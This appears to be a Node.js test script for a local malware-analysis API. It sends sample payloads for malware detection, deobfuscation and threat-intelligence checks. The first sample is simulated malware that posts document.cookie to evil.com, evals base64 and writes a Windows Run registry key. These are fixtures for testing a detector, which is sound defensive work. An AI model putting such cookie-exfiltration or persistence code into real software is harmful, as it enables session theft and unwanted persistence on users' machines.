const axios = require('axios');

// Test WASM analysis endpoint
async function testWasmAnalysis() {
  const apiUrl = 'http://localhost:3000';
  
  console.log('Testing WASM Analysis Pipeline...\n');
  
  // Test 1: Simple malware pattern detection
  console.log('Test 1: Malware Pattern Detection');
  try {
    const malwareTest = await axios.post(`${apiUrl}/api/v1/analyze`, {
      content: `
        function maliciousCode() {
          // Simulated malware patterns
          const c2_server = "http://evil.com/command";
          const stolen_data = document.cookie;
          fetch(c2_server, { method: 'POST', body: stolen_data });
          
          // Obfuscated code
          eval(atob('YWxlcnQoImhhY2tlZCIp'));
          
          // Registry modification attempt
          const wsh = new ActiveXObject("WScript.Shell");
          wsh.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware", "malware.exe");
        }
      `,
      analysisType: 'MALWARE_ANALYSIS',
      priority: 'high',
      metadata: {
        fileType: 'javascript',
        source: 'test-script'
      }
    }, {
      headers: {
        'X-API-Key': 'test-key-123',
        'Content-Type': 'application/json'
      }
    });
    
    console.log('Response:', JSON.stringify(malwareTest.data, null, 2));
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
  }
  
  console.log('\n---\n');
  
  // Test 2: Deobfuscation test
  console.log('Test 2: Code Deobfuscation');
  try {
    const obfuscatedCode = await axios.post(`${apiUrl}/api/v1/analyze`, {
      content: Buffer.from(`
        var _0x1234=['log','Hello','World'];
        (function(_0x5678,_0x9abc){
          var _0xdef0=function(_0x1111){
            while(--_0x1111){
              _0x5678['push'](_0x5678['shift']());
            }
          };
          _0xdef0(++_0x9abc);
        }(_0x1234,0x123));
        var _0x5678=function(_0x9abc,_0xdef0){
          _0x9abc=_0x9abc-0x0;
          var _0x1111=_0x1234[_0x9abc];
          return _0x1111;
        };
        console[_0x5678('0x0')](_0x5678('0x1')+' '+_0x5678('0x2'));
      `).toString('base64'),
      analysisType: 'CODE_DEOBFUSCATION',
      metadata: {
        encoding: 'base64',
        fileType: 'javascript'
      }
    }, {
      headers: {
        'X-API-Key': 'test-key-123',
        'Content-Type': 'application/json'
      }
    });
    
    console.log('Response:', JSON.stringify(obfuscatedCode.data, null, 2));
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
  }
  
  console.log('\n---\n');
  
  // Test 3: Network threat detection
  console.log('Test 3: Network Threat Detection');
  try {
    const networkTest = await axios.post(`${apiUrl}/api/v1/analyze`, {
      content: `
        Network capture analysis:
        - Suspicious DNS queries to: malware-c2.evil.com
        - HTTP POST to IP: 192.168.1.100:4444
        - Encrypted traffic on non-standard port 8888
        - Multiple connection attempts to TOR nodes
        - Data exfiltration pattern detected: 50MB uploaded to external server
      `,
      analysisType: 'THREAT_INTELLIGENCE',
      metadata: {
        fileType: 'network-log',
        source: 'packet-capture'
      }
    }, {
      headers: {
        'X-API-Key': 'test-key-123',
        'Content-Type': 'application/json'
      }
    });
    
    console.log('Response:', JSON.stringify(networkTest.data, null, 2));
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
  }
  
  console.log('\n---\n');
  
  // Test 4: WASM preprocessing status
  console.log('Test 4: Check WASM Status');
  try {
    const wasmStatus = await axios.get(`${apiUrl}/api/v1/status/wasm`);
    console.log('WASM Status:', JSON.stringify(wasmStatus.data, null, 2));
  } catch (error) {
    console.error('Error:', error.response?.data || error.message);
  }
}

// Run tests
testWasmAnalysis().catch(console.error);